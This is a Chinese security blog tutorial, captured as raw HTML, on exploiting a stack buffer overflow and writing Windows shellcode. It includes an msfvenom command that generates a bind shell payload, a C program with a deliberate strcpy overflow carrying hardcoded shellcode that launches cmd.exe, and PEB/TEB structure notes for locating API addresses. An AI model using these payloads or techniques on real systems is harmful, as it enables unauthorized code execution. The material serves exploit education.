<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>从栈溢出到简单的shellcode开发 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 从栈溢出到简单的shellcode开发评论Feed" href="http://www.mottoin.com/86821.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}

Options:
 -p, --payload &lt;payload&gt; Payload to use. Specify a '-' or stdin to use custom payloads
 --payload-options List the payload's standard options
 -l, --list [type] List a module type. Options are: payloads, encoders, nops, all
 -n, --nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload
 -f, --format &lt;format&gt; Output format (use --help-formats for a list)
 --help-formats List available formats
 -e, --encoder &lt;encoder&gt; The encoder to use
 -a, --arch &lt;arch&gt; The architecture to use
 --platform &lt;platform&gt; The platform of the payload
 --help-platforms List available platforms
 -s, --space &lt;length&gt; The maximum size of the resulting payload
 --encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value)
 -b, --bad-chars &lt;list&gt; The list of characters to avoid example: '\x00\xff'
 -i, --iterations &lt;count&gt; The number of times to encode the payload
 -c, --add-code &lt;path&gt; Specify an additional win32 shellcode file to include
 -x, --template &lt;path&gt; Specify a custom executable file to use as a template
 -k, --keep Preserve the template behavior and inject the payload as a new thread
 -o, --out &lt;path&gt; Save the payload
 -v, --var-name &lt;name&gt; Specify a custom variable name to use for certain output formats
 --smallest Generate the smallest possible payload
 -h, --help Show this message</pre>
<p>example:</p>
<blockquote><p>msfvenom -p windows/shell/bind_tcp -b &#8216;\x00&#8217; -f c</p></blockquote>
<p>这里我测试的时候,shellcode必须小于206字节.msfvenom的payload普遍在300字节以上. 或者上网搜那种不考虑环境问题的简短shellcode</p>
<pre class="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char name[]="\x61\x61\x61\x61"
 "\x61\x61\x61\x61"
 "\x7b\x46\x86\x7c"
 "\x7b\x46\x86\x7c"
 "\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb"
 "\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78"
 "\x65\x20\x2f\x63\x20\x63\x6d\x64";
void test(char * a)
{
 char output[8];
 strcpy(output,a);
 printf("%s\n",output);
}

int main()
{
 test(name);
 return 0;
}</pre>
<p>或者动手编写,这之前再看一个基础知识点:</p>
<ol>
<li>基址(image base):pe文件装入内存时的基地址,例如exe文件在内存中的基址是0x00400000.</li>
<li>虚拟内存地址(virtual addr,VA):pe文件中的指令被装入内存时的地址.</li>
<li>相对虚拟地址(relative virtual addr,RVA):内存地址相对于映射基址的偏移量.<br />
三者关系: VA=RVA+基址.</li>
</ol>
<p>编写shellcode也是有章可循的,不同版本的windows加载dll有不同的基址. 为了shellcode能在任何不可预料的环境工作(是否aslr),目标api的地址不能用绝对地址.那么只有相对了,因为shellcode可以导入任何dll并调用其函数,如果漏洞程序已经导入了LoadLibrary和GetProcAddress函数最好,但真实情况往往没那么顺利.</p>
<p>假设我们shellcode的目的是运行cmd.exe,winexe、shellexecute(shellexecuteEx)、createprocess可以实现,前两个api最终都是createprocess实现,而createprocess是kernel32.dll的导出函数. 目前用的最广泛的办法是通过进程控制模块(PEB)来确定dll的导出表,并确定程序运行时所需api在内存中的虚拟地址. PEB是一种进程结构,类似的还有TEB线程控制模块(Thread Environment Block)</p>
<h3>操作步骤:</h3>
<p>1.通过段寄存器fs确定找到当前的线程控制模块TEB,PEB位于fs:[0x30]地址的double word里,通过这个指针即可获得PEB地址 code:</p>
<pre class="">__asm
{
mov eax,fs:[0x30]
mov PEB,eax
}</pre>
<h3>TEB结构:</h3>
<pre class="">+0x000 NtTib : _NT_TIB 
 +0x01c EnvironmentPointer : Ptr32 Void
 +0x020 ClientId : _CLIENT_ID //
 +0x028 ActiveRpcHandle : Ptr32 Void
 +0x02c ThreadLocalStoragePointer : Ptr32 Void
 +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
 +0x034 LastErrorValue : Uint4B
 +0x038 CountOfOwnedCriticalSections : Uint4B
 +0x03c CsrClientThread : Ptr32 Void
 +0x040 Win32ThreadInfo : Ptr32 Void
 +0x044 User32Reserved : [26] Uint4B
 +0x0ac UserReserved : [5] Uint4B
 +0x0c0 WOW32Reserved : Ptr32 Void
 +0x0c4 CurrentLocale : Uint4B
 +0x0c8 FpSoftwareStatusRegister : Uint4B
 +0x0cc SystemReserved1 : [54] Ptr32 Void
 +0x1a4 ExceptionCode : Int4B
 +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK
 +0x1bc SpareBytes1 : [24] UChar
 +0x1d4 GdiTebBatch : _GDI_TEB_BATCH
 +0x6b4 RealClientId : _CLIENT_ID
 +0x6bc GdiCachedProcessHandle : Ptr32 Void
 +0x6c0 GdiClientPID : Uint4B
 +0x6c4 GdiClientTID : Uint4B
 +0x6c8 GdiThreadLocalInfo : Ptr32 Void
 +0x6cc Win32ClientInfo : [62] Uint4B
 +0x7c4 glDispatchTable : [233] Ptr32 Void
 +0xb68 glReserved1 : [29] Uint4B
 +0xbdc glReserved2 : Ptr32 Void
 +0xbe0 glSectionInfo : Ptr32 Void
 +0xbe4 glSection : Ptr32 Void
 +0xbe8 glTable : Ptr32 Void
 +0xbec glCurrentRC : Ptr32 Void
 +0xbf0 glContext : Ptr32 Void
 +0xbf4 LastStatusValue : Uint4B
 +0xbf8 StaticUnicodeString : _UNICODE_STRING
 +0xc00 StaticUnicodeBuffer : [261] Uint2B
 +0xe0c DeallocationStack : Ptr32 Void
 +0xe10 TlsSlots : [64] Ptr32 Void
 +0xf10 TlsLinks : _LIST_ENTRY
 +0xf18 Vdm : Ptr32 Void
 +0xf1c ReservedForNtRpc : Ptr32 Void
 +0xf20 DbgSsReserved : [2] Ptr32 Void
 +0xf28 HardErrorsAreDisabled : Uint4B
 +0xf2c Instrumentation : [16] Ptr32 Void
 +0xf6c WinSockData : Ptr32 Void
 +0xf70 GdiBatchCount : Uint4B
 +0xf74 InDbgPrint : UChar
 +0xf75 FreeStackOnTermination : UChar
 +0xf76 HasFiberData : UChar
 +0xf77 IdealProcessor : UChar
 +0xf78 Spare3 : Uint4B
 +0xf7c ReservedForPerf : Ptr32 Void
 +0xf80 ReservedForOle : Ptr32 Void
 +0xf84 WaitingOnLoaderLock : Uint4B
 +0xf88 Wx86Thread : _Wx86ThreadState
 +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void
 +0xf98 ImpersonationLocale : Uint4B
 +0xf9c IsImpersonating : Uint4B
 +0xfa0 NlsCache : Ptr32 Void
 +0xfa4 pShimData : Ptr32 Void
 +0xfa8 HeapVirtualAffinity : Uint4B
 +0xfac CurrentTransactionHandle : Ptr32 Void
 +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME
 +0xfb4 SafeThunkCall : UChar
 +0xfb5 BooleanSpare : [3] UChar</pre>
<p>TEB若干指针各偏移说明: FS:[000] 指向SEH链指针 FS:[004] 线程堆栈顶部 FS:[008] 线程堆栈底部 FS:[00C] SubSystemTib FS:[010] FiberData FS:[014] ArbitraryUserPointer FS:[018] 指向TEB自身 FS:[020] 进程PID FS:[024] 线程ID FS:[02C] 指向线程局部存储指针 FS:[030] PEB结构地址（进程结构） FS:[034] 上个错误号</p>
<h3>PEB结构：</h3>
<pre class="">typedef struct _PEB { 
 000h UCHAR InheritedAddressSpace;
 001h UCHAR ReadImageFileExecOptions;
 002h UCHAR BeingDebugged; 
 003h UCHAR SpareBool;
 004h HANDLE Mutant;
 008h HINSTANCE ImageBaseAddress; 
 00Ch struct _PEB_LDR_DATA *Ldr //Ptr32 _PEB_LDR_DATA
 010h struct _RTL_USER_PROCESS_PARAMETERS *ProcessParameters;
 014h ULONG SubSystemData;
 018h HANDLE DefaultHeap;
 01Ch KSPIN_LOCK FastPebLock;
 020h ULONG FastPebLockRoutine;
 024h ULONG FastPebUnlockRoutine;
 028h ULONG EnvironmentUpdateCount;
 02Ch ULONG KernelCallbackTable;
 030h LARGE_INTEGER SystemReserved;
 038h struct _PEB_FREE_BLOCK *FreeList
 03Ch ULONG TlsExpansionCounter;
 040h ULONG TlsBitmap;
